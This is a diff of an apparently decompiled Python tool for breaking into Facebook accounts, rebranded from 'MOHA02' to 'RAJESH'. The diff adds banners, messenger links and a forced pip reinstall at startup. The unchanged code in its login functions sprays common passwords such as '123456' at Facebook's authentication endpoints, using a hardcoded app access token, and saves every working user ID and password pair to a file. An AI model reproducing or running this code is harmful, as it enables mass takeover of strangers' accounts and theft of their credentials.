@@ -1,4 +1,5 @@
-
+# -*- coding: utf-8 -*-
+# Decompiled from Python 3.12 bytecode
 
 import os
 import re
@@ -17,11 +18,6 @@ from concurrent.futures import ThreadPoolExecutor as tred
 from os import system
 from datetime import datetime
 
-
-os.system('termux-open-url https://t.me/m_oha0_2b')
-os.system('termux-tts-speak "Welcome to MOHA EL SHELFAWI ZERO TWO TOOL"')
-
-
 # Ensure required modules are installed
 modules = ['requests', 'urllib3', 'mechanize', 'rich']
 for module in modules:
@@ -37,7 +33,18 @@ requests.urllib3.disable_warnings()
 
 
 # Initial setup and promotion
-
+os.system('clear')
+print(' \x1b[38;5;46m𝐑𝐀𝐉𝐄𝐒𝐇 SERVER LOADING....')
+os.system('espeak -a 300 " RAJESH SERVER LOADING"')
+os.system('xdg-open https://chat.whatsapp.com/G3CRBzuTQO47c4YyaKHAf9?mode=ac_t')
+os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+os.system('pip install httpx pip install beautifulsoup4')
+os.system('xdg-open https://t.me/Rajeshvailoveyou')
+print('loading Modules ...\n')
+os.system('clear')
+print(' \x1b[38;5;46mRAJESH SERVER SUCCESSFUL LOGIN....')
+os.system('espeak -a 300 " RAJESH SERVER SUCCESSFUL LOGIN."')
+os.system('xdg-open https://t.me/+9llqPQbiQ1hiN2Vl/')
 
 
 # --- Anti-tampering and Security Checks ---
@@ -146,7 +153,7 @@ def window1():
 
 
 # Set window title
-sys.stdout.write('\x1b]2;𓆩【🧬 Moha02 KING🧬】𓆪 \x07')
+sys.stdout.write('\x1b]2;𓆩【🧬 𝐑𝐀𝐉𝐄𝐒𝐇 KING🧬】𓆪 \x07')
 
 
 def ____banner____():
@@ -157,19 +164,7 @@ def ____banner____():
         os.system('cls')
     else:
         os.system('clear')
-    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  /$$$$$$                      /$$
- /$$__  $$                    | $$
-| $$  \__/ /$$   /$$  /$$$$$$ | $$
-| $$      | $$  | $$ /$$__  $$| $$
-| $$      | $$  | $$| $$  \__/| $$
-| $$    $$| $$  | $$| $$      | $$
-|  $$$$$$/|  $$$$$$/| $$      | $$
- \______/  \______/ |__/      |__/
-                                  
-                                  
-                                  
-46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\x1b[1;37m  [\x1b[38;5;196m+\x1b[1;37m] \x1b[38;5;214mDEVELOPER \x1b[1;37m: \x1b[38;5;51mMOHA02\x1b[0m\n\x1b[1;37m  [\x1b[38;5;196m+\x1b[1;37m] \x1b[38;5;214mTELEGRAM  \x1b[1;37m: \x1b[38;5;51m@m_oha0_2b\x1b[0m\n\x1b[1;37m  [\x1b[38;5;196m+\x1b[1;37m] \x1b[38;5;214mVERSION   \x1b[1;37m: \x1b[38;5;51m3.0 (PREMIUM)\x1b[0m\n\x1b[1;37m  [\x1b[38;5;196m+\x1b[1;37m] \x1b[38;5;214mSTATUS    \x1b[1;37m: \x1b[38;5;46mACTIVE\x1b[0m\n\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\x1b[1;37m  (\x1b[38;5;196m1\x1b[1;37m) \x1b[38;5;51mSTART ATTACK\x1b[0m\n\x1b[1;37m  (\x1b[38;5;196m2\x1b[1;37m) \x1b[38;5;51mCHECK UPDATES\x1b[0m\n\x1b[1;37m  (\x1b[38;5;196m0\x1b[1;37m) \x1b[38;5;196mEXIT TOOL\x1b[0m\n\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m')
-
+    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n    \x1b[38;5;50m██████╗  \x1b[34;1m█████╗      \x1b[1;37m██╗\x1b[38;5;46m███████╗\x1b[33;1m███████╗\x1b[38;5;196m██╗  ██╗\n    \x1b[38;5;50m██╔══██╗\x1b[34;1m██╔══██╗     \x1b[1;37m██║\x1b[38;5;46m██╔════╝\x1b[33;1m██╔════╝\x1b[38;5;196m██║  ██║\n    \x1b[38;5;50m██████╔╝\x1b[34;1m███████║     \x1b[1;37m██║\x1b[38;5;46m█████╗  \x1b[33;1m███████╗\x1b[38;5;196m███████║\n    \x1b[38;5;50m██╔══██╗\x1b[34;1m██╔══██║\x1b[1;37m██   ██║\x1b[38;5;46m██╔══╝  \x1b[33;1m╚════██║\x1b[38;5;196m██╔══██║\n    \x1b[38;5;50m██║  ██║\x1b[34;1m██║  ██║\x1b[1;37m╚█████╔╝\x1b[38;5;46m███████╗\x1b[33;1m███████║\x1b[38;5;196m██║  ██║\n    \x1b[38;5;50m╚═╝  ╚═╝\x1b[34;1m╚═╝  ╚═╝ \x1b[1;37m╚════╝ \x1b[38;5;46m╚══════╝\x1b[33;1m╚══════╝\x1b[38;5;196m╚═╝  ╚═╝\n   \x1b[38;5;48m━━━━━━━━━━━━━\x1b[38;5;196m(\x1b[1;37m\x1b[0;45mRAJESH PRIVATE TOOLS\x1b[0;92m\x1b[38;5;196m)\x1b[38;5;48m━━━━━━━━━━━━━\n       \x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m\x1b[38;5;46mVERSION\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[0;44m2.6\x1b[0;92m\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37m\x1b[0;45m13-Aug-2025\x1b[0;92m\x1b[38;5;196m) 🇮🇳\n       \x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mAUTHOR\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m𝐑𝐀𝐉𝐄𝐒𝐇       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\n       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mGITHUB\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46m𝐑𝐀𝐉𝐄𝐒𝐇-404   \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\n       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSTATUS\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOLD CRACKING \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\n\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
 
 def creationyear(uid):
@@ -394,7 +389,7 @@ def login_1(uid):
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r\x1b[1;37m>\x1b[38;5;196m+\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37m🌏MOHA02-M1🧬\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.write(f"\r\r\x1b[1;37m>\x1b[38;5;196m+\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37m🌏RAJESH-M1🧬\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
@@ -439,12 +434,12 @@ def login_1(uid):
             }
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(🌏\x1b[1;37mMOHA02🧬\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(🌏\x1b[1;37mRAJESH🧬\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                 open('/sdcard/RAJESH-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(🌏\x1b[1;37mMOHA02🧬\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(🌏\x1b[1;37mRAJESH🧬\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                 open('/sdcard/RAJESH-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
@@ -457,7 +452,7 @@ def login_2(uid):
     """
     Login attempt method 2.
     """
-    sys.stdout.write(f"\r\r\x1b[1;37m>\x1b[38;5;196m+\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mMOHA 02🧬\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+    sys.stdout.write(f"\r\r\x1b[1;37m>\x1b[38;5;196m+\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37m🌏RAJESH-M2🧬\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
     
     for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
         try:
@@ -475,12 +470,12 @@ def login_2(uid):
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
-                    print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(🌏\x1b[1;37mMOHA02🧬\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                    print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(🌏\x1b[1;37mRAJESH🧬\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                     open('/sdcard/RAJESH-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
                 elif 'session_key' in po:
-                    print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(🌏\x1b[1;37mMoha02🧬\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                    print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(🌏\x1b[1;37mRAJESH🧬\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                     open('/sdcard/RAJESH-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
